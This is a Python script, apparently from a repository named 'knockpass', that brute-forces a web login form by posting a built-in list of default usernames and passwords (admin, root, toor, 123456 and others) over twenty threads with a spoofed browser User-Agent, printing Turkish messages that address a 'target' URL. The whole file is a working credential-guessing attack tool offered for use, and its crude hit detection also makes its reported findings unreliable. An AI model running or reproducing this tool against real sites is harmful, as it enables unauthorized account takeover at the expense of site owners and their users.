#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

# repo: knockpass

USERS = ["admin", "root", "user", "test", "administrator", "guest"]
PASSWORDS = [
    "123456", "password", "admin", "admin123", "root", "toor",
    "guest", "123456789", "qwerty", "password123", "12345678",
    "1234", "12345", "welcome", "letmein", "login", "changeme"
]

HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0)"}

def try_login(url, user, pwd):
    try:
        data = {"username": user, "password": pwd, "log": user, "pwd": pwd}
        r = requests.post(url, data=data, timeout=5, headers=HEADERS, allow_redirects=False)

        if r.status_code in (301, 302):
            return user, pwd, "redirect"

        text = r.text.lower()
        if any(k in text[:800] for k in ["dashboard", "welcome", "logout", "admin"]):
            return user, pwd, "success"

        if len(r.text) > 200 and not any(k in text[:500] for k in ["error", "invalid", "wrong"]):
            return user, pwd, "maybe"
    except:
        pass
    return None

def main():
    if len(sys.argv) < 2:
        print("Kullanim: python3 knockpass.py <login_url>")
        print("Ornek: python3 knockpass.py http://hedef.com/login")
        sys.exit(1)

    url = sys.argv[1]
    print(f"[*] Hedef: {url}")
    print(f"[*] {len(USERS)} user x {len(PASSWORDS)} pass = {len(USERS)*len(PASSWORDS)} deneme\n")

    found = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = []
        for user in USERS:
            for pwd in PASSWORDS:
                futures.append(ex.submit(try_login, url, user, pwd))

        for f in futures:
            res = f.result()
            if res:
                user, pwd, status = res
                print(f"[+] {status.upper()}: {user}:{pwd}")
                found.append(res)

    print(f"\n[*] {len(found)} aday bulundu.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Durduruldu.")
